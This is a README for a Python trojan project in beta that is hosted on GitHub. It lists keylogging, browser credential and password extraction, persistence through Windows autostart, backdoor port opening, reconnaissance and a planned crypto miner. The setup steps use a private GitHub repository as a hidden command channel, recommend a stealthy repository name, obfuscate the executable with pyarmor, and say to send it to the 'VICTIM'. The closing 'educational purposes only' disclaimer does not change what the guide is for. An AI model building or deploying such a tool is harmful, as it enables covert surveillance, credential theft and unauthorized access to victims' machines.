
# Trojan Project in Progress 🚀

Hi there! 👋  

Welcome to the **Trojan Project**, currently in its **beta stage**. This project is under active development and provides various tools and features to interact with a target system for **educational purposes only**. Here's what the project offers and how to set it up:

---

## 🔥 Current Features
- **System Information Retrieval 🖥️**  
  Gather detailed information about the target's operating system and environment variables. This module helps understand the victim's system setup and retrieve detailed network configuration data, including IP addresses, active connections, and public IP information.
  
- **Directory Lister 📂**  
  Explore files and directories in the target's system, enabling navigation through the victim's file system.
  
- **Windows Auto Start 🛠️**  
  Automatically configure the program to start with the operating system on Windows devices.

- **Port Opener 🔓**  
  Enables the opening of specific ports on the target system to facilitate communication or create backdoors for remote access.

- **Open Ports Scanner 🔍**  
  Identify open ports on the target Windows system, enabling network-level reconnaissance.

- **Windows Screenshots 📸**  
  Capture screenshots of the target's desktop on Windows systems. (Currently a work in progress with ongoing improvements.)

- **Keylogger 🔑**  
  A feature to capture keyboard inputs for monitoring activities.

- **Cryptocurrency Miner 💰**  
  Integrate a mining tool if I come up with a brilliant implementation plan.

- **Browser Data Extraction 🔐**  
  Extract saved credentials, passwords, and browsing history from common web browsers (Firefox, Chrome).

---

## ⚙️ How It Works
### **Project Structure**
The project follows this structure for modularity and ease of development:

```
├── config
│   └── abc.json
├── main.py
├── modules
│   ├── autostart.py
│   ├── browser_data_extractor.py
│   ├── btcminer.py
│   ├── dirlister.py
│   ├── environment.py
│   ├── gitimporter.py
│   ├── keylogger.py
│   ├── mytoken.txt
│   ├── openportslister.py
│   ├── port_opener.py
│   ├── screenshot.py
│   └── trojan.py
├── README.md
└── requirements.txt
```

---

### **Setting Up**
To ensure the project works seamlessly:
1. Navigate to the `modules` directory and create a file named `mytoken.txt`.
   - Inside this file, paste your **GitHub personal access token** for authentication.  
   - Learn how to create a token [here](https://github.com/settings/tokens).

2. Modify the `gitimporter.py` file to use your GitHub username and private repository name:  

```python
# Set your GitHub username
user = 'Rskladanek'  # Replace with your GitHub username

# Log in to GitHub using the token
sess = github3.login(token=token)

# Return the repository object
return sess.repository(user, 'Trojan')  # Replace 'Trojan' with your repository name
```

3. Create a private repository with a discreet name (avoid names like "Trojan" to maintain stealth).

4. Install the required dependencies:
   ```bash
   pip install -r requirements.txt
   ```

5. Prepare the executable:
   ```bash
   pyarmor pack -x " --add-data config/*:config --add-data modules/*:modules" main.py
   ```
   Then send it to your "VICTIM".

---

## ⚠️ Disclaimer
This project is strictly for **educational purposes only**. Unauthorized use of this software is illegal and violates laws and regulations. Always ensure you have explicit permission before deploying or testing this tool.

---

Stay tuned for updates! 🌟 Let’s keep it safe and "Smurf-tastic"! 😉